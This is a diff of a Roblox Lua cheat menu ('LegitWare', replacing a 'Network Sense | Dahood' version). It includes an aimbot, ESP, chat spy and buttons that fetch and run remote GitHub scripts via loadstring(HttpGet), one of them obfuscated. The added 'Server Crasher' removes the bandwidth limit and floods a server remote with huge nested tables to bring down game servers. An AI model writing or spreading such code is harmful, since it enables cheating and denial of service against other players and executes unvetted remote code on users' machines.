@@ -1,218 +1,15 @@
--- Dahood
-if game.PlaceId then -- Game Check
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))() -- Init
-local Window = OrionLib:MakeWindow({Name = "Network Sense | Dahood | Made By NetCat", HidePremium = false, IntroText = "Network Sense | Dahood | Made By NetCat", SaveConfig = true, ConfigFolder = "NetworkSettings"}) -- Init
-
--- Visuals
-local Visuals = Window:MakeTab({
-        Name = "Visual",
-        Icon = "rbxassetid://4483345998",
-        PremiumOnly = false
-    })
-    Visuals:AddButton({
-        Name = "ESP",
-        Default = false,
-        Callback = function(Value)
-            pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/networkcatwork/dagood/main/esp.lua'))() end)
-            OrionLib:MakeNotification({
-                Name = "ESP!",
-                Content = "ESP Activated!",
-                Image = "rbxassetid://4483345998",
-                Time = 5
-            })
-        end    
-    })
-    Visuals:AddButton({
-        Name = "Chat Spy",
-        Default = false,
-        Callback = function(Value)
-                local ChatFrame = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame 
-            ChatFrame.ChatChannelParentFrame.Visible = true 
-            ChatFrame.ChatBarParentFrame.Position = ChatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), ChatFrame.ChatChannelParentFrame.Size.Y)
-            OrionLib:MakeNotification({
-                Name = "Chat Spy!",
-                Content = "Chat Spy Activated!",
-                Image = "rbxassetid://4483345998",
-                Time = 5
-            })
-        end    
-    })
--- End of Visuals
-
--- Extra
-local Extra = Window:MakeTab({
-    Name = "Extra",
-    Icon = "rbxassetid://4483345998",
-    PremiumOnly = false
-})
-Visuals:AddButton({
-	Name = "X-ray | Press E",
-	Callback = function()
-      		pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/HeyGyt/xray/main/main"))() end)
-  	end    
-})
-Extra:AddButton({
-    Name = "Admin",
-    Default = false,
-    Callback = function(Value)
-        pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))() end)
-        OrionLib:MakeNotification({
-            Name = "Admin!",
-            Content = "Admin Activated!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end   
-})
-Extra:AddButton({
-    Name = "DarkDex",
-    Default = false,
-    Callback = function(Value)
-        pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/TacticalBFG/HelicityScripts/master/darkdex.lua'))() end)
-        OrionLib:MakeNotification({
-            Name = "DarkDex!",
-            Content = "DarkDex Activated!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end   
-})
-Extra:AddButton({
-    Name = "Air Swmi",
-    Default = false,
-    Callback = function(Value)
-        pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/airswim/main/main'))() end)
-        OrionLib:MakeNotification({
-            Name = "Air Swim!",
-            Content = "Air Swim Activated!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end   
-})
-Extra:AddButton({
-    Name = "Infinite Jump",
-    Default = false,
-    Callback = function(Value)
-        pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/infjump/main/main'))() end)
-        OrionLib:MakeNotification({
-            Name = "Infin Jump!",
-            Content = "Infinite Jump Activated!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end   
-})
-Visuals:AddButton({
-    Name = "Full Bright",
-    Default = false,
-    Callback = function(value)
-        game:GetService("Lighting").Brightness = 2
-        game:GetService("Lighting").ClockTime = 14
-        game:GetService("Lighting").FogEnd = 100000
-        game:GetService("Lighting").GlobalShadows = false
-        game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
-        OrionLib:MakeNotification({
-            Name = "Full Bright!",
-            Content = "FullBright Activated!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end
-})
-Extra:AddButton({
-    Name = "BTools",
-    Default = false,
-    Callback = function(Value)
-        pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/btools/main/main'))() end)
-        OrionLib:MakeNotification({
-            Name = "BTools!",
-            Content = "BTools Activated!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end   
-})
--- End of Extra
-
--- General
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "LegitWare",IntroText = "LegitWare", HidePremium = false, SaveConfig = true, ConfigFolder = "LegitConfig"})
+ 
 local General = Window:MakeTab({
 	Name = "General",
 	Icon = "rbxassetid://4483345998",
 	PremiumOnly = false
 })
-General:AddButton({
-	Name = "Fling",
-	Callback = function()
-	    loadstring(game:HttpGet(('https://raw.githubusercontent.com/0Ben1/fe/main/obf_5wpM7bBcOPspmX7lQ3m75SrYNWqxZ858ai3tJdEAId6jSI05IOUB224FQ0VSAswH.lua.txt'),true))()
-  	end    
-})
-General:AddButton({
-    Name = "Aimbot | Press E",
-    Default = false,
-    Callback = function(Value)
-        pcall(function() loadstring(game:HttpGet('https://raw.githubusercontent.com/networkcatwork/dagood/main/aimbot.lua'))() end)
-        OrionLib:MakeNotification({
-            Name = "Aimbot!",
-            Content = "Press E to Activate!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end    
-})
-General:AddButton({
-    Name = "NoClip | Press E NW!!!",
-    Default = false,
-    Callback = function(Value)
-        local player = game.Players.LocalPlayer
-        local mouse = player:GetMouse()
-        local runservice = game:GetService("RunService")
-        local noclip = false
-        
-        local msg = Instance.new("Message", player.PlayerGui)
-        msg.Text = "Noclip Script! Press on 'e' to noclip & 't' to destroy this message!"
-        
-        runservice.Stepped:Connect(function()
-            if noclip then
-                player.Character.Humanoid:ChangeState(11)
-            end
-        end)
-        
-        mouse.KeyDown:Connect(function(key)
-            if key == "t" then
-                msg:Destroy()
-            end
-        end)
-        
-        mouse.KeyDown:Connect(function(key)
-            if key == "e" then
-                noclip = true
-                player.Character.Humanoid:ChangeState(11)
-            end
-        end)
-        OrionLib:MakeNotification({
-            Name = "NoClip!",
-            Content = "Press E to Activate!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end    
-})
-General:AddButton({
-    Name = "Infinite Money",
-    Default = false,
-    Callback = function(Value)
-        _G.Cash = "$999,777,771" 
 
-game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.MoneyText.Text = _G.Cash
-game:GetService("Players").LocalPlayer.Backpack.Wallet.Handle.BillboardGui.TextLabel.Text = _G.Cash
-game:GetService("Players").LocalPlayer.Backpack.Wallet.Handle.BillboardGui.TextLabel.Value = _G.Cash
-    end    
-})
 General:AddButton({
-    Name = "AimbotNoCircle | Press Q",
-    Default = false,
-    Callback = function(Value)
+	Name = "Aimbot | Press Q",
+	Callback = function()
         getgenv().prediction = 0.102
 getgenv().offset = 0.6
 getgenv().resolver = false
@@ -321,94 +118,231 @@ end
 end
 end
 end)
-        OrionLib:MakeNotification({
-            Name = "Aimbot!",
-            Content = "Press Q to Activate!",
-            Image = "rbxassetid://4483345998",
-            Time = 5
-        })
-    end    
+  	end    
 })
-General:AddButton({
-	Name = "TP to Player",
+
+local Visual = Window:MakeTab({
+	Name = "Visual",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Visual:AddButton({
+	Name = "Tracers",
 	Callback = function()
-local player = game.Players.LocalPlayer
+        pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/networkcatwork/dagood/main/esp.lua"))() end)
+  	end    
+})
 
-local targetUsername = ""
+Visual:AddButton({
+	Name = "Remove ESP",
+	Callback = function()
+local Players = game:GetService("Players")
 
-local gui = Instance.new("ScreenGui")
-gui.Name = "TP to Player"
-gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true
-gui.DisplayOrder = 10
-gui.Parent = game.CoreGui
-
-local frame = Instance.new("Frame")
-frame.Name = "MainFrame"
-frame.Size = UDim2.new(0, 300, 0, 200)
-frame.Position = UDim2.new(0.5, -150, 0.5, -100) 
-frame.BackgroundColor3 = Color3.fromRGB(101, 7, 173) 
-frame.BorderSizePixel = 2
-frame.BorderColor3 = Color3.fromRGB(0, 0, 0) 
-frame.Parent = gui
-
-local closeButton = Instance.new("TextButton")
-closeButton.Name = "CloseButton"
-closeButton.Text = "X"
-closeButton.Size = UDim2.new(0, 20, 0, 20)
-closeButton.Position = UDim2.new(1, -20, 0, 0) 
-closeButton.TextColor3 = Color3.fromRGB(255, 0, 0) 
-closeButton.BackgroundColor3 = Color3.fromRGB(101, 7, 173)
-closeButton.BorderSizePixel = 0
-closeButton.Font = Enum.Font.SourceSansBold
-closeButton.TextSize = 14
-closeButton.Parent = frame
-
-local textBox = Instance.new("TextBox")
-textBox.Name = "Enter Username"
-textBox.PlaceholderText = "Enter username..."
-textBox.Text = ""
-textBox.Size = UDim2.new(0.8, 0, 0, 30)
-textBox.Position = UDim2.new(0.1, 0, 0.3, -15)
-textBox.TextColor3 = Color3.fromRGB(0, 0, 0)
-textBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-textBox.BorderSizePixel = 2
-textBox.Parent = frame
-
-local updateButton = Instance.new("TextButton")
-updateButton.Name = "Teleport"
-updateButton.Text = "TP to Player"
-updateButton.Size = UDim2.new(0.8, 0, 0, 30)
-updateButton.Position = UDim2.new(0.1, 0, 0.7, -15)
-updateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-updateButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215) 
-updateButton.BorderSizePixel = 0
-updateButton.Font = Enum.Font.SourceSansBold
-updateButton.TextSize = 16
-updateButton.Parent = frame
-
-local function closeGUI()
-    gui:Destroy()
-end
-
-local function updateTargetAndMove()
-    targetUsername = textBox.Text
-    local players = game:GetService("Players")
-    local targetPlayer = players:FindFirstChild(targetUsername)
-    if targetPlayer then
-        player.Character:MoveTo(targetPlayer.Character.HumanoidRootPart.Position)
-    else
-        warn("Player not found with username:", targetUsername)
+local function removeHighlightFromCharacter(character)
+    local charHighlight = character:FindFirstChild("Highlight")
+    if charHighlight then
+        charHighlight:Destroy()
     end
 end
 
-closeButton.MouseButton1Click:Connect(closeGUI)
+local function removeAllHighlights()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Character then
+            removeHighlightFromCharacter(player.Character)
+        end
+        player.CharacterAdded:Connect(function(character)
+            removeHighlightFromCharacter(character)
+        end)
+    end
+end
 
-updateButton.MouseButton1Click:Connect(updateTargetAndMove)
+removeAllHighlights()
+
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        removeHighlightFromCharacter(character)
+    end)
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    if player.Character then
+        removeHighlightFromCharacter(player.Character)
+    end
+end)
 
   	end    
 })
--- End of General
 
+Visual:AddButton({
+	Name = "ESP",
+	Callback = function()
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local highlight = Instance.new("Highlight")
+highlight.Name = "Highlight"
+
+local function highlightCharacter(character)
+    if not character:FindFirstChild("Highlight") then
+        local charHighlight = highlight:Clone()
+        charHighlight.Parent = character
+    end
 end
+
+local function removeHighlightFromCharacter(character)
+    local charHighlight = character:FindFirstChild("Highlight")
+    if charHighlight then
+        charHighlight:Destroy()
+    end
+end
+
+local function highlightAllPlayers()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Character then
+            highlightCharacter(player.Character)
+        end
+        player.CharacterAdded:Connect(function(character)
+            highlightCharacter(character)
+        end)
+    end
+end
+
+local function removeAllHighlights()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player.Character then
+            removeHighlightFromCharacter(player.Character)
+        end
+        player.CharacterAdded:Connect(function(character)
+            removeHighlightFromCharacter(character)
+        end)
+    end
+end
+
+highlightAllPlayers()
+
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function(character)
+        highlightCharacter(character)
+    end)
+end)
+
+Players.PlayerRemoving:Connect(function(player)
+    if player.Character then
+        removeHighlightFromCharacter(player.Character)
+    end
+end)
+  	end    
+})
+
+
+Visual:AddButton({
+	Name = "Chat Spy",
+	Callback = function()
+        local ChatFrame = game:GetService("Players").LocalPlayer.PlayerGui.Chat.Frame 
+        ChatFrame.ChatChannelParentFrame.Visible = true 
+        ChatFrame.ChatBarParentFrame.Position = ChatFrame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(), ChatFrame.ChatChannelParentFrame.Size.Y)
+  	end    
+})
+
+local OP = Window:MakeTab({
+	Name = "Over Powered",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+OP:AddButton({
+	Name = "Server Crasher",
+	Callback = function()
+        while wait(0.6) do
+            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+            local function getmaxvalue(val)
+               local mainvalueifonetable = 499999
+               if type(val) ~= "number" then
+                   return nil
+               end
+               local calculateperfectval = (mainvalueifonetable/(val+2))
+               return calculateperfectval
+            end
+            
+            local function bomb(tableincrease, tries)
+            local maintable = {}
+            local spammedtable = {}
+            
+            table.insert(spammedtable, {})
+            z = spammedtable[1]
+            
+            for i = 1, tableincrease do
+                local tableins = {}
+                table.insert(z, tableins)
+                z = tableins
+            end
+            
+            local calculatemax = getmaxvalue(tableincrease)
+            local maximum
+            
+            if calculatemax then
+                 maximum = calculatemax
+                 else
+                 maximum = 999999
+            end
+            
+            for i = 1, maximum do
+                 table.insert(maintable, spammedtable)
+            end
+            
+            for i = 1, tries do
+                 game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
+            end
+            end
+            
+            bomb(250, 2) 
+            end
+  	end    
+})
+
+local Extras = Window:MakeTab({
+     Name = "Extra",
+     Icon = "rbxassetid://4483345998",
+     PremiumOnly = false
+ })
+
+ Extras:AddButton({
+     Name = "Admin",
+     Default = false,
+     Callback = function(Value)
+         loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))
+     end   
+ })
+
+ Extras:AddButton({
+     Name = "DarkDex",
+     Default = false,
+     Callback = function(Value)
+       loadstring(game:HttpGet('https://raw.githubusercontent.com/TacticalBFG/HelicityScripts/master/darkdex.lua'))
+     end   
+ })
+
+ Extras:AddButton({
+     Name = "Air Swim",
+     Default = false,
+     Callback = function(Value)
+         loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/airswim/main/main'))
+     end   
+ })
+ Extras:AddButton({
+     Name = "Infinite Jump",
+     Default = false,
+     Callback = function(Value)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/infjump/main/main'))
+     end   
+ }) 
+
+ Extras:AddButton({
+     Name = "BTools",
+     Default = false,
+     Callback = function(Value)
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/HeyGyt/btools/main/main'))
+     end   
+ })
+
 OrionLib:Init()
